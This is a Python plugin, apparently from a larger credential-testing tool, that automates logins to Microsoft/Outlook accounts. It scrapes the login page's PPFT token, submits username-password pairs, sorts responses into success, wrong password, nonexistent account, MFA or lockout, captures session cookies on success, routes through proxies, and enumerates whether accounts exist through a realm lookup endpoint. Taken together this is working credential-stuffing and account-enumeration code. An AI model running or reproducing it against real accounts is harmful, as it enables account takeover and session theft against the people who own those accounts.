from typing import Optional, Dict, Any
import asyncio

from ...core.plugin_interface import WebPlugin, LoginResult, AuthResult, SessionData


class OutlookPlugin(WebPlugin):
    name = "outlook"
    version = "2.0.0"
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.base_url = "https://login.live.com"
        
    async def login(self, username: str, password: str,
                   session: Optional[Any] = None,
                   proxy: Optional[str] = None) -> LoginResult:
        import httpx
        
        start = asyncio.get_event_loop().time()
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            async with httpx.AsyncClient(proxies=proxy, headers=headers, follow_redirects=True) as client:
                # Get login page
                resp = await client.get(
                    "https://login.live.com/login.srf",
                    params={"wa": "wsignin1.0"}
                )
                
                # Extract PPFT token
                import re
                ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]*)"', resp.text)
                ppft = ppft_match.group(1) if ppft_match else ""
                
                # Login data
                login_data = {
                    "login": username,
                    "loginfmt": username,
                    "passwd": password,
                    "PPFT": ppft,
                    "PPSX": "Passport",
                    "type": "11",
                    "NewUser": "1",
                    "LoginOptions": "3"
                }
                
                resp = await client.post(
                    "https://login.live.com/ppsecure/post.srf",
                    data=login_data
                )
                
                elapsed = (asyncio.get_event_loop().time() - start) * 1000
                
                text = resp.text.lower()
                
                if "password is incorrect" in text:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                if "that microsoft account doesn" in text:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        message="Account doesn't exist"
                    )
                
                if "verify your identity" in text or "two-step" in text:
                    return LoginResult(
                        result=AuthResult.MFA_REQUIRED,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                if "account has been locked" in text:
                    return LoginResult(
                        result=AuthResult.LOCKOUT,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                # Success check
                if "signout" in text or "account.microsoft.com" in str(resp.url):
                    return LoginResult(
                        result=AuthResult.SUCCESS,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        session=SessionData(
                            cookies=dict(client.cookies),
                            user_agent=headers["User-Agent"],
                            proxy_used=proxy
                        )
                    )
                
                return LoginResult(
                    result=AuthResult.UNKNOWN,
                    username=username,
                    password=password,
                    response_time_ms=elapsed
                )
                
        except Exception as e:
            return LoginResult(
                result=AuthResult.ERROR,
                username=username,
                password=password,
                message=str(e)
            )
    
    async def enumerate(self, username: str, session=None, proxy=None):
        from ...core.plugin_interface import EnumerateResult
        import httpx
        
        try:
            async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
                resp = await client.get(
                    "https://login.microsoftonline.com/common/userrealm/",
                    params={"user": username, "api-version": "2.1"}
                )
                data = resp.json()
                
                if data.get("NameSpaceType") in ["Federated", "Managed"]:
                    return EnumerateResult(
                        username=username,
                        exists=True,
                        confidence=0.9
                    )
        except:
            pass
        
        return EnumerateResult(username=username, exists=None, confidence=0.0)